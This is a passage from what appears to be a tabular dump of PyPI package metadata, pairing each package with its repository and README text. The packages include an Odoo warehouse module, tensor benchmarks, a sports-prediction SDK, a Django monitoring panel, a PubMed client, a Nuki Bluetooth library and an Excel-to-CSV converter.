    :target: https://odoo-community.org/page/development-status
    :alt: Production/Stable
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fstock--logistics--warehouse-lightgray.png?logo=github
    :target: https://github.com/OCA/stock-logistics-warehouse/tree/16.0/stock_location_position
    :alt: OCA/stock-logistics-warehouse
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/stock-logistics-warehouse-16-0/stock-logistics-warehouse-16-0-stock_location_position
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/153/16.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module adds position attributes on stock location such as:

* Corridor
* Row
* Rack
* Level

and renames position (XYZ) to box (XYZ).

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/stock-logistics-warehouse/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/stock-logistics-warehouse/issues/new?body=module:%20stock_location_position%0Aversion:%2016.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* BCIM
* Okia
* Camptocamp

Contributors
~~~~~~~~~~~~

* Syvain Van Hoof (Okia sprl) <sylvainvh@okia.be>
* Jacques-Etienne Baudoux (BCIM) <je@bcim.be>
* Guewen Baconnier (Camptocamp) <guewen.baconnier@camptocamp.com>
* Akim Juillerat <akim.juillerat@camptocamp.com>
* Phuc Tran Thanh <phuc@trobz.com>

Other credits
~~~~~~~~~~~~~

The development of this module has been financially supported by:

* Camptocamp

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/stock-logistics-warehouse <https://github.com/OCA/stock-logistics-warehouse/tree/16.0/stock_location_position>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","=======================
Stock Location Position
=======================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Production%2FStable-green.png
    :target: https://odoo-community.org/page/development-status
    :alt: Production/Stable
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fstock--logistics--warehouse-lightgray.png?logo=github
    :target: https://github.com/OCA/stock-logistics-warehouse/tree/16.0/stock_location_position
    :alt: OCA/stock-logistics-warehouse
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/stock-logistics-warehouse-16-0/stock-logistics-warehouse-16-0-stock_location_position
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/153/16.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module adds position attributes on stock location such as:

* Corridor
* Row
* Rack
* Level

and renames position (XYZ) to box (XYZ).

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* BCIM
* Okia
* Camptocamp

Contributors
~~~~~~~~~~~~

* Syvain Van Hoof (Okia sprl) 
* Jacques-Etienne Baudoux (BCIM) 
* Guewen Baconnier (Camptocamp) 
* Akim Juillerat 
* Phuc Tran Thanh 

Other credits
~~~~~~~~~~~~~

The development of this module has been financially supported by:

* Camptocamp

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/stock-logistics-warehouse `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/stock-logistics-warehouse
teneva-bm,https://github.com/AndreiChertkov/teneva_bm,2,2423,2423,"# teneva_bm


## Description

Benchmarks library, based on a software product [teneva](https://github.com/AndreiChertkov/teneva), for tensor based multidimensional approximation and optimization methods. Benchmarks include both multidimensional data arrays and discretized functions of many variables.


## Installation

> Current version ""0.1.0"".

The package can be installed via pip: `pip install teneva_bm` (it requires the [Python](https://www.python.org) programming language of the version >= 3.8). It can be also downloaded from the repository [teneva_bm](https://github.com/AndreiChertkov/teneva_bm) and installed by `python setup.py install` command from the root folder of the project.

> Required python packages [matplotlib](https://matplotlib.org/) (3.7.0+) and [teneva](https://github.com/AndreiChertkov/teneva) (0.14.0+) will be automatically installed during the installation of the main software product.

Some benchmarks require additional installation of specialized libraries. The corresponding instructions are given in the description of each benchmark (see `DESC` string in the corresponding python files). Installation of all required libraries for all benchmarks can be done with the following command:

```bash
pip install networkx==3.0 qubogen==0.1.1 gekko==1.0.6
```


## Documentation and examples

All benchmarks inherit from the `Bm` base class (`teneva_bm/bm.py`) and are located in the `teneva_bm` folder. The corresponding python files contain a detailed description of the benchmarks, as well as a script for a demo run at the end of the file. You can run demos for all benchmarks at once with the command `python demo.py` from the root folder of the project.

A typical scenario for working with a benchmark is as follows:
```python
import numpy as np
from teneva_bm import *
np.random.seed(42)

# Prepare benchmark and print info:
bm = BmQuboMaxCut().prep()
print(bm.info())

# Get value at multi-index i:
i = np.ones(bm.d)
print(bm[i])

# Get values for batch of multi-indices I:
I = np.array([i, i, i])
print(bm[I])

# Generate random train dataset:
I_trn, y_trn = bm.build_trn(1000)
```


## Authors

- [Andrei Chertkov](https://github.com/AndreiChertkov)
- [Gleb Ryzhakov](https://github.com/G-Ryzhakov)
- [Ivan Oseledets](https://github.com/oseledets)

> ✭__🚂  The stars that you give to **teneva_bm**, motivate us to develop faster and add new interesting features to the code 😃
","# teneva_bm


## Description

Benchmarks library, based on a software product [teneva](https://github.com/AndreiChertkov/teneva), for tensor based multidimensional approximation and optimization methods. Benchmarks include both multidimensional data arrays and discretized functions of many variables.


## Installation

> Current version ""0.1.0"".

The package can be installed via pip: `pip install teneva_bm` (it requires the [Python](https://www.python.org) programming language of the version >= 3.8). It can be also downloaded from the repository [teneva_bm](https://github.com/AndreiChertkov/teneva_bm) and installed by `python setup.py install` command from the root folder of the project.

> Required python packages [matplotlib](https://matplotlib.org/) (3.7.0+) and [teneva](https://github.com/AndreiChertkov/teneva) (0.14.0+) will be automatically installed during the installation of the main software product.

Some benchmarks require additional installation of specialized libraries. The corresponding instructions are given in the description of each benchmark (see `DESC` string in the corresponding python files). Installation of all required libraries for all benchmarks can be done with the following command:

```bash
pip install networkx==3.0 qubogen==0.1.1 gekko==1.0.6
```


## Documentation and examples

All benchmarks inherit from the `Bm` base class (`teneva_bm/bm.py`) and are located in the `teneva_bm` folder. The corresponding python files contain a detailed description of the benchmarks, as well as a script for a demo run at the end of the file. You can run demos for all benchmarks at once with the command `python demo.py` from the root folder of the project.

A typical scenario for working with a benchmark is as follows:
```python
import numpy as np
from teneva_bm import *
np.random.seed(42)

# Prepare benchmark and print info:
bm = BmQuboMaxCut().prep()
print(bm.info())

# Get value at multi-index i:
i = np.ones(bm.d)
print(bm[i])

# Get values for batch of multi-indices I:
I = np.array([i, i, i])
print(bm[I])

# Generate random train dataset:
I_trn, y_trn = bm.build_trn(1000)
```


## Authors

- [Andrei Chertkov](https://github.com/AndreiChertkov)
- [Gleb Ryzhakov](https://github.com/G-Ryzhakov)
- [Ivan Oseledets](https://github.com/oseledets)

> ✭__🚂  The stars that you give to **teneva_bm**, motivate us to develop faster and add new interesting features to the code 😃
",andreichertkov/teneva_bm
spayk,https://github.com/aggelen/Spayk,0,0,0,,,aggelen/spayk
frontrunner-sdk,https://github.com/GetFrontrunner/frontrunner-sdk,8,3664,3664,"# Frontrunner SDK

[Frontrunner][frontrunner] is the first zero gas fee, decentralized sports
prediction market built on blockchain where you get the best odds with no house
edge.

[frontrunner]: https://www.getfrontrunner.com/

This is an SDK which allows you to interact with our public-facing API easily
via Python.

## Developer

Note: this assumes OSX

### Prerequisite Installation

Install [`brew`][brew]. This will be used to install other required tooling.

[brew]: https://brew.sh/

Install [Visual Studio Code][vscode]. This repository has configuration for
vscode to make the development experience uniform and smooth for everyone.

[vscode]: https://code.visualstudio.com/

```sh
brew install --cask visual-studio-code
```

Install [`pants`][pants]. Pants is a generic build tool that supports multiple
languages and tools. Both local builds and CI builds use Pants.

[pants]: https://www.pantsbuild.org/docs/welcome-to-pants

```sh
brew install pantsbuild/tap/pants
```

Clone the repository. Then, open up the repository in vscode.
[Install the recommended extensions][install-recommended-extensions] for this
workspace. Restart vscode.

[install-recommended-extensions]: https://code.visualstudio.com/docs/editor/extension-marketplace#_workspace-recommended-extensions

In a terminal at the root of the repository, test your setup by running...

```sh
pants lint ::
pants check ::
pants test ::
```

To make vscode use the correct Python environment, in a terminal, run...

```sh
pants export ::
```

To activate the virtual environment in a shell, run...

```sh
bash ./dist/export/python/virtualenv/3.8.16/bin/activate
```

### Codegen

Generate Python code using the remote `openapi.json` and [swagger-codegen][swagger-codegen].

[swagger-codegen]: https://github.com/swagger-api/swagger-codegen

#### Installation

```sh
brew install swagger-codegen
```

#### Adding a Client

1. Add a dir under `openapi`
2. Put the API's `openapi.json` in that directory
3. Run `./scripts/codegen.sh`

#### Getting Help

To see additional options:

```sh
swagger-codegen generate --help
swagger-codegen config-help -l python
```

### Running Tests

To test everything, run...

```sh
pants test ::
```

To test a single file, run...

```sh
pants test --no-use-coverage ${file}
```

### Auto Format Code

To format everything and fix the code for Flake8, run...

```sh
pants fmt ::
pants fix ::
```

### Local Testing via REPL

To get a Python shell to test code, run...

```sh
pants repl ::
```

### Viewing Docs

To view docs generated from the `docs` folder, run...

```sh
./scripts/slate.sh serve
```

Then, in a browser, open http://localhost:8000.

### Building Docs Locally

To build docs locally, run...

```sh
./scripts/slate.sh build
```

## Deployments and Releases

### Developer Documentation

The slate documentation deploys on every `master` branch merge.

### Release Process

1. Create a tagged release with an appropriate semantic version eg. if the current version is 0.4.2, the next patch version would be 0.4.3, or a next minor version would be 0.5.0. Use the [New Release Form][new-release-form] to create the release. Make sure it is marked as **pre-release**.
1. Install the SDK from TestPyPI: `pip install --upgrade --index-url https://test.pypi.org/simple/ frontrunner-sdk`.
1. Edit the release -- remove the checkmark from ""Set as a pre-release"" and save.
1. Install the SDK from PyPI (production): `pip install --upgrade frontrunner-sdk`

[new-release-form]: https://github.com/GetFrontrunner/frontrunner-sdk/releases/new

Test PyPI: https://test.pypi.org/project/frontrunner-sdk/
Prod PyPI: https://pypi.org/project/frontrunner-sdk/
","# Frontrunner SDK

[Frontrunner][frontrunner] is the first zero gas fee, decentralized sports
prediction market built on blockchain where you get the best odds with no house
edge.

[frontrunner]: https://www.getfrontrunner.com/

This is an SDK which allows you to interact with our public-facing API easily
via Python.

## Developer

Note: this assumes OSX

### Prerequisite Installation

Install [`brew`][brew]. This will be used to install other required tooling.

[brew]: https://brew.sh/

Install [Visual Studio Code][vscode]. This repository has configuration for
vscode to make the development experience uniform and smooth for everyone.

[vscode]: https://code.visualstudio.com/

```sh
brew install --cask visual-studio-code
```

Install [`pants`][pants]. Pants is a generic build tool that supports multiple
languages and tools. Both local builds and CI builds use Pants.

[pants]: https://www.pantsbuild.org/docs/welcome-to-pants

```sh
brew install pantsbuild/tap/pants
```

Clone the repository. Then, open up the repository in vscode.
[Install the recommended extensions][install-recommended-extensions] for this
workspace. Restart vscode.

[install-recommended-extensions]: https://code.visualstudio.com/docs/editor/extension-marketplace#_workspace-recommended-extensions

In a terminal at the root of the repository, test your setup by running...

```sh
pants lint ::
pants check ::
pants test ::
```

To make vscode use the correct Python environment, in a terminal, run...

```sh
pants export ::
```

To activate the virtual environment in a shell, run...

```sh
bash ./dist/export/python/virtualenv/3.8.16/bin/activate
```

### Codegen

Generate Python code using the remote `openapi.json` and [swagger-codegen][swagger-codegen].

[swagger-codegen]: https://github.com/swagger-api/swagger-codegen

#### Installation

```sh
brew install swagger-codegen
```

#### Adding a Client

1. Add a dir under `openapi`
2. Put the API's `openapi.json` in that directory
3. Run `./scripts/codegen.sh`

#### Getting Help

To see additional options:

```sh
swagger-codegen generate --help
swagger-codegen config-help -l python
```

### Running Tests

To test everything, run...

```sh
pants test ::
```

To test a single file, run...

```sh
pants test --no-use-coverage ${file}
```

### Auto Format Code

To format everything and fix the code for Flake8, run...

```sh
pants fmt ::
pants fix ::
```

### Local Testing via REPL

To get a Python shell to test code, run...

```sh
pants repl ::
```

### Viewing Docs

To view docs generated from the `docs` folder, run...

```sh
./scripts/slate.sh serve
```

Then, in a browser, open http://localhost:8000.

### Building Docs Locally

To build docs locally, run...

```sh
./scripts/slate.sh build
```

## Deployments and Releases

### Developer Documentation

The slate documentation deploys on every `master` branch merge.

### Release Process

1. Create a tagged release with an appropriate semantic version eg. if the current version is 0.4.2, the next patch version would be 0.4.3, or a next minor version would be 0.5.0. Use the [New Release Form][new-release-form] to create the release. Make sure it is marked as **pre-release**.
1. Install the SDK from TestPyPI: `pip install --upgrade --index-url https://test.pypi.org/simple/ frontrunner-sdk`.
1. Edit the release -- remove the checkmark from ""Set as a pre-release"" and save.
1. Install the SDK from PyPI (production): `pip install --upgrade frontrunner-sdk`

[new-release-form]: https://github.com/GetFrontrunner/frontrunner-sdk/releases/new

Test PyPI: https://test.pypi.org/project/frontrunner-sdk/
Prod PyPI: https://pypi.org/project/frontrunner-sdk/
",getfrontrunner/frontrunner-sdk
django-project-panel,https://github.com/EfrosiniaPetrovna/django-project-panel,1,1390,1390,"Простая мониторинг-панель проекта (размеры всех таблиц в базе данных, медиа файлов и т.д)

***
Установка:

1. добавить в
INSTALLED_APPS = [
	...
	'django_project_panel',
]

2. добавить в urls проекта
path('project_panel/', include('django_project_panel.urls')),

3. выполнить миграции django_project_panel
manage.py makemigrations django_project_panel
manage.py migrate django_project_panel

***
Настройка:

Добавить в settings.py

PROJECT_PANEL = {
	'folders_files': [
		{'path': os.path.join(BASE_DIR, 'logs'), 'label': 'Логи'},
		{'path': os.path.join(BASE_DIR, 'static'), 'label': 'Статика'},
		{'path': BASE_DIR, 'label': 'Проект'},
	],
	'clean_model': {
		'default.reports': {'filter_field_lt': 'created_at'},
	},
}

folders_files - можно перечислить каталоги и файлы, данные о которых нужно выводить в панели
каталог медиа уже добавлен

clean_model - можно перечислить таблицы, для которых будет доступа функция очистки в панели
'clean_model': {
	'<алиас базы>.<имя таблицы>': {'filter_field_lt': '<имя поля для фильтрации записей на удаление>'},
},

ВАЖНО!
Удаление записей происходит в соответствии с настройками on_delete вашей таблицы в базе

***
Права:
- Панель управления проектом - просмотр
- Панель управления проектом - управление

***
Подходит для mysql/mariadb и postgresql

***
url расширения: /project_panel/panel/
","Простая мониторинг-панель проекта (размеры всех таблиц в базе данных, медиа файлов и т.д)

***
Установка:

1. добавить в
INSTALLED_APPS = [
	...
	'django_project_panel',
]

2. добавить в urls проекта
path('project_panel/', include('django_project_panel.urls')),

3. выполнить миграции django_project_panel
manage.py makemigrations django_project_panel
manage.py migrate django_project_panel

***
Настройка:

Добавить в settings.py

PROJECT_PANEL = {
	'folders_files': [
		{'path': os.path.join(BASE_DIR, 'logs'), 'label': 'Логи'},
		{'path': os.path.join(BASE_DIR, 'static'), 'label': 'Статика'},
		{'path': BASE_DIR, 'label': 'Проект'},
	],
	'clean_model': {
		'default.reports': {'filter_field_lt': 'created_at'},
	},
}

folders_files - можно перечислить каталоги и файлы, данные о которых нужно выводить в панели
каталог медиа уже добавлен

clean_model - можно перечислить таблицы, для которых будет доступа функция очистки в панели
'clean_model': {
	'<алиас базы>.<имя таблицы>': {'filter_field_lt': '<имя поля для фильтрации записей на удаление>'},
},

ВАЖНО!
Удаление записей происходит в соответствии с настройками on_delete вашей таблицы в базе

***
Права:
- Панель управления проектом - просмотр
- Панель управления проектом - управление

***
Подходит для mysql/mariadb и postgresql

***
url расширения: /project_panel/panel/
",efrosiniapetrovna/django-project-panel
pypmed,https://github.com/jermwatt/pypmed,2,1017,1017,"[![Python application](https://github.com/jermwatt/pypmed/actions/workflows/python-app.yml/badge.svg)](https://github.com/jermwatt/pypmed/actions/workflows/python-app.yml)

# pypmed - a simple Python interface for [PubMed's API](https://eutils.ncbi.nlm.nih.gov/entrez/eutils/esearch.fcgi/)

pypmed is a Python library that provides easy access to the [PubMed's APIs](https://eutils.ncbi.nlm.nih.gov/entrez/eutils/esearch.fcgi/).

## Installation

`pip install pypmed`

## Example usage

This example can be executed in [this example notebook](https://colab.research.google.com/github/jermwatt/pypmed/blob/main/pypmed_example_usage.ipynb#scrollTo=8TBhToBJo8ZY).

```python
from pypmed import apis 

search_criteria = {'author_first_name': 'rachel', 
                   'author_last_name': 'gottschalk', 
                   'institution':  'university of pittsburgh at pittsburgh',
                   'publication_year': 2022
                   }

response = apis.query_pubmed_api(search_criteria=search_criteria)
```

","[![Python application](https://github.com/jermwatt/pypmed/actions/workflows/python-app.yml/badge.svg)](https://github.com/jermwatt/pypmed/actions/workflows/python-app.yml)

# pypmed - a simple Python interface for [PubMed's API](https://eutils.ncbi.nlm.nih.gov/entrez/eutils/esearch.fcgi/)

pypmed is a Python library that provides easy access to the [PubMed's APIs](https://eutils.ncbi.nlm.nih.gov/entrez/eutils/esearch.fcgi/).

## Installation

`pip install pypmed`

## Example usage

This example can be executed in [this example notebook](https://colab.research.google.com/github/jermwatt/pypmed/blob/main/pypmed_example_usage.ipynb#scrollTo=8TBhToBJo8ZY).

```python
from pypmed import apis 

search_criteria = {'author_first_name': 'rachel', 
                   'author_last_name': 'gottschalk', 
                   'institution':  'university of pittsburgh at pittsburgh',
                   'publication_year': 2022
                   }

response = apis.query_pubmed_api(search_criteria=search_criteria)
```

",jermwatt/pypmed
libretiny-esphome-dashboard,https://github.com/esphome/dashboard,0,0,0,,,esphome/dashboard
apollo-sdk,https://github.com/apolloapi/apolloapi,15,0,0,,,apolloapi/apolloapi
torch-scaler,https://github.com/ihna-ceres/torch-scaler,2,0,0,,,ihna-ceres/torch-scaler
aiha,https://github.com/chainyo/aiha,0,562,465,"# 🦉 AI Hardware Advisor

<div align=""center"">
  <img src=""img/logo.png"" width=""200"" height=""200"" />
  <p><em>AIHA, Guiding AI with Wisdom and Knowledge</em></p>
</div>

---

AIHA is a tool to help you choose the best hardware for your AI project. With AIHA you will able to choose wisely
the resources you need for inference or training any model on the Hugging Face Hub.

**AIHA is currently in construction.**

Feel free to contribute to the project by opening an issue or a pull request.

If you find the project useful, please consider giving it a star ⭐️.

","# 🦉 AI Hardware Advisor



AIHA, Guiding AI with Wisdom and Knowledge


---

AIHA is a tool to help you choose the best hardware for your AI project. With AIHA you will able to choose wisely
the resources you need for inference or training any model on the Hugging Face Hub.

**AIHA is currently in construction.**

Feel free to contribute to the project by opening an issue or a pull request.

If you find the project useful, please consider giving it a star ⭐️.

",chainyo/aiha
pynukibt,https://github.com/ronengr/pyNukiBT,4,1394,1394,"# pyNukiBT
Nuki Bluetooth API

This is only a python API implementation of the Bluetooth communication with Nuki lock.
It is not intended to be used as a stand alone solution, only as a library that can be used by other solutions (like the [RaspiNukiBridge](https://github.com/ronengr/RaspiNukiBridge) web Nuki-Bridge implementation or the [hass_nuki_bt](https://github.com/ronengr/hass_nuki_bt) Home Assistant component)

## Background
- This is based on [RaspiNukiBridge](https://github.com/dauden1184/RaspiNukiBridge) by [dauden1184](https://github.com/dauden1184/) and [RaspiNukiBridge](https://github.com/regevbr/RaspiNukiBridge) [regevbr](https://github.com/regevbr)
- Nuki documentation
  - [Nuki Smart Lock API V2.2.1](https://developer.nuki.io/page/nuki-smart-lock-api-2/2/)

> Important - if you are experiencing delays using RPI, it is advised to use a bluetooth dongle instead of the builtin bluetooth hardware.
> [TP-LINK UB400](https://www.tp-link.com/us/home-networking/usb-adapter/ub400/) is verified to be working.

> ### Raspberry Pi 3B+ and 4 only
>
> It might be necessary to DOWNGRADE Bluez. [See comment](https://github.com/dauden1184/RaspiNukiBridge/issues/1#issuecomment-1103969957).
>
> ```
> wget http://ftp.hk.debian.org/debian/pool/main/b/bluez/bluez_5.50-1.2~deb10u2_armhf.deb
> sudo apt install ./bluez_5.50-1.2~deb10u2_armhf.deb
> ```
>
> Reboot the Raspberry Pi
","# pyNukiBT
Nuki Bluetooth API

This is only a python API implementation of the Bluetooth communication with Nuki lock.
It is not intended to be used as a stand alone solution, only as a library that can be used by other solutions (like the [RaspiNukiBridge](https://github.com/ronengr/RaspiNukiBridge) web Nuki-Bridge implementation or the [hass_nuki_bt](https://github.com/ronengr/hass_nuki_bt) Home Assistant component)

## Background
- This is based on [RaspiNukiBridge](https://github.com/dauden1184/RaspiNukiBridge) by [dauden1184](https://github.com/dauden1184/) and [RaspiNukiBridge](https://github.com/regevbr/RaspiNukiBridge) [regevbr](https://github.com/regevbr)
- Nuki documentation
  - [Nuki Smart Lock API V2.2.1](https://developer.nuki.io/page/nuki-smart-lock-api-2/2/)

> Important - if you are experiencing delays using RPI, it is advised to use a bluetooth dongle instead of the builtin bluetooth hardware.
> [TP-LINK UB400](https://www.tp-link.com/us/home-networking/usb-adapter/ub400/) is verified to be working.

> ### Raspberry Pi 3B+ and 4 only
>
> It might be necessary to DOWNGRADE Bluez. [See comment](https://github.com/dauden1184/RaspiNukiBridge/issues/1#issuecomment-1103969957).
>
> ```
> wget http://ftp.hk.debian.org/debian/pool/main/b/bluez/bluez_5.50-1.2~deb10u2_armhf.deb
> sudo apt install ./bluez_5.50-1.2~deb10u2_armhf.deb
> ```
>
> Reboot the Raspberry Pi
",ronengr/pynukibt
mpxl2csv,https://github.com/hariya99/mpxl2csv,2,601,601,"# MPXL2CSV
A Python Multiprocessing library to convert Excel(xlsx) files to csv. Python based libraries are notoriously slow to process large Excel files. This library utilizes Python multiprocessing and openpyxl to process multiple Excel files in parallel so as to reduce the total time taken to convert them. 
# Installing
```
pip install mpxl2csv
```
# Sample Usage:
```Python
from mpxl2csv import Excel2Csv

mp = Excel2Csv(num_processes=3, delimiter=""|"")
xl_path = os.path.join(os.getcwd(), ""sample_input"")
csv_path = os.path.join(os.getcwd(), ""sample_output"")
mp.convert(xl_path, csv_path) 

```
","# MPXL2CSV
A Python Multiprocessing library to convert Excel(xlsx) files to csv. Python based libraries are notoriously slow to process large Excel files. This library utilizes Python multiprocessing and openpyxl to process multiple Excel files in parallel so as to reduce the total time taken to convert them. 
# Installing
```
pip install mpxl2csv
```
# Sample Usage:
```Python
from mpxl2csv import Excel2Csv

mp = Excel2Csv(num_processes=3, delimiter=""|"")
xl_path = os.path.join(os.getcwd(), ""sample_input"")
csv_path = os.path.join(os.getcwd(), ""sample_output"")
mp.convert(xl_path, csv_path) 

```
",hariya99/mpxl2csv
nonebot-plugin-megumin,https://github.com/youlanan/nonebot_plugin_megumin,2,1778,1046,"<div align=""center"">
  <a href=""https://v2.nonebot.dev/store""><img src=""https://github.com/youlanan/nonebot_plugin_megumin/blob/main/img/nbp_logo.png"" width=""180"" height=""180"" alt=""NoneBotPluginLogo""></a>
  <br>
  <p><img src=""https://github.com/A-kirami/nonebot-plugin-template/blob/resources/NoneBotPlugin.svg"" width=""240"" alt=""NoneBotPluginText""></p>
</div>

<div align=""center"">

# nonebot_plugin_megumin

_✨ 为美好群聊献上爆炎 ✨_


<img src=""https://img.shields.io/badge/python-3.8+-blue.svg"" alt=""python"">

</div>


## 🌱 介绍

_可以触发 以视频、或语音+文字 形式的爆裂魔法_

_自带刷屏屏蔽、可自定义释放与补魔次数_

_让群友领略最强魔法的艺术与魅力_

_爆裂魔法啦啦啦(⑅ōᴗō)۶..._

## 🔧 安装

<details>
<summary>使用 nb-cli 安装</summary>
在 nonebot2 项目的根目录下打开命令行, 输入以下指令即可安装

    nb plugin install nonebot_plugin_megumin

</details>

<details>
<summary>使用包管理器安装</summary>
在 nonebot2 项目的插件目录下, 打开命令行, 根据你使用的包管理器, 输入相应的安装命令

<details>
<summary>pip</summary>

    pip install nonebot-plugin-megumin
</details>

打开 nonebot2 项目根目录下的 `pyproject.toml` 文件, 在 `[tool.nonebot]` 部分追加写入

    plugins = [""nonebot-plugin-megumin""]

</details>

<details>
<summary>下载 本仓库源码 安装</summary>

    下载后将 nonebot_plugin_megumin 丢进nb目录下的src/plugin目录下, 确保正确配置nb可以载入该目录内的插件

</details>

- 需要发送视频或语音, 所以请确保你安装并正确配置了ffmpeg
- 完成上述步骤后，下载项目' 爆炎资源包 '中的' Explosion.zip ', 按提示将资源放置在指定位置, 以完成安装
- 可供选择的触发形式为视频/语音/混合, 在项目的' cfg.py '文件中进行修改, 有对应注释说明

## ✨ 指令
### 指令表
| 指令 | 权限 | 指令前缀 | 范围 | 说明 |
|:-----:|:----:|:----:|:----:|:----:|
| 爆裂魔法 | 群员 | 默认 | 群聊 | 常用触发指令 |
| 补魔 | 群员 | 默认 | 群聊私聊 | 刷新可触发次数 |
| 补魔帮助 | 群员 | 默认 | 群聊私聊 | 插件的帮助 |

注：如果给bot配置过指令前缀, 则触发指令为前缀+指令, 例如 /爆裂魔法
### 效果图
<img src=""https://github.com/youlanan/nonebot_plugin_megumin/blob/main/img/help.png"" width=""300"" height=""700"" alt=""效果图"">

## ⚡ 项目灵感
>伊雷娜bot曾经有的功能

>[借鉴了EXPLOSION-惠惠爆裂魔法语音](https://github.com/pcrbot/Explosion)

","






# nonebot_plugin_megumin

_✨ 为美好群聊献上爆炎 ✨_






## 🌱 介绍

_可以触发 以视频、或语音+文字 形式的爆裂魔法_

_自带刷屏屏蔽、可自定义释放与补魔次数_

_让群友领略最强魔法的艺术与魅力_

_爆裂魔法啦啦啦(⑅ōᴗō)۶..._

## 🔧 安装


使用 nb-cli 安装
在 nonebot2 项目的根目录下打开命令行, 输入以下指令即可安装

    nb plugin install nonebot_plugin_megumin



使用包管理器安装
在 nonebot2 项目的插件目录下, 打开命令行, 根据你使用的包管理器, 输入相应的安装命令


pip

    pip install nonebot-plugin-megumin


打开 nonebot2 项目根目录下的 `pyproject.toml` 文件, 在 `[tool.nonebot]` 部分追加写入

    plugins = [""nonebot-plugin-megumin""]



下载 本仓库源码 安装

    下载后将 nonebot_plugin_megumin 丢进nb目录下的src/plugin目录下, 确保正确配置nb可以载入该目录内的插件



- 需要发送视频或语音, 所以请确保你安装并正确配置了ffmpeg
- 完成上述步骤后，下载项目' 爆炎资源包 '中的' Explosion.zip ', 按提示将资源放置在指定位置, 以完成安装
- 可供选择的触发形式为视频/语音/混合, 在项目的' cfg.py '文件中进行修改, 有对应注释说明

## ✨ 指令
### 指令表
| 指令 | 权限 | 指令前缀 | 范围 | 说明 |
|:-----:|:----:|:----:|:----:|:----:|
| 爆裂魔法 | 群员 | 默认 | 群聊 | 常用触发指令 |
| 补魔 | 群员 | 默认 | 群聊私聊 | 刷新可触发次数 |
| 补魔帮助 | 群员 | 默认 | 群聊私聊 | 插件的帮助 |

注：如果给bot配置过指令前缀, 则触发指令为前缀+指令, 例如 /爆裂魔法
### 效果图


## ⚡ 项目灵感
>伊雷娜bot曾经有的功能

>[借鉴了EXPLOSION-惠惠爆裂魔法语音](https://github.com/pcrbot/Explosion)

",youlanan/nonebot_plugin_megumin
validator-and-token-generator,https://github.com/SasheO/CS3_Project,1,491,491,"### Description
Validator_and_token_generator is a package created for a class project to validate certain strings such as credit/debit card numbers, and generate alphanumeric tokens.

### Install validator_and_token_generator from PyPi.
```bash
pip install validator_and_token_generator
```

#### Example
```python
  # Import library
  import validator_and_token_generator
  # Generate token
  _token = validator_and_token_generator.token_generator(length=10)
```
-------

","### Description
Validator_and_token_generator is a package created for a class project to validate certain strings such as credit/debit card numbers, and generate alphanumeric tokens.

### Install validator_and_token_generator from PyPi.
```bash
pip install validator_and_token_generator
```

#### Example
```python
  # Import library
  import validator_and_token_generator
  # Generate token
  _token = validator_and_token_generator.token_generator(length=10)
```
-------

",sasheo/cs3_project
apple-store-scraper,https://github.com/hiyali/apple-store-scraper,1,4182,4182,"![build](https://img.shields.io/github/workflow/status/hiyali/apple-store-scraper/Build)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/hiyali/apple-store-scraper/pulls)
[![PyPI](https://img.shields.io/pypi/v/apple-store-scraper)](https://pypi.org/project/apple-store-scraper/)
![downloads](https://img.shields.io/pypi/dm/apple-store-scraper)
![license](https://img.shields.io/pypi/l/apple-store-scraper)
![code style](https://img.shields.io/badge/code%20style-black-black)

```
   ___                _____ _                   _____
  / _ \              /  ___| |                 /  ___|
 / /_\ \_ __  _ __   \ `--.| |_ ___  _ __ ___  \ `--.  ___ _ __ __ _ _ __   ___ _ __
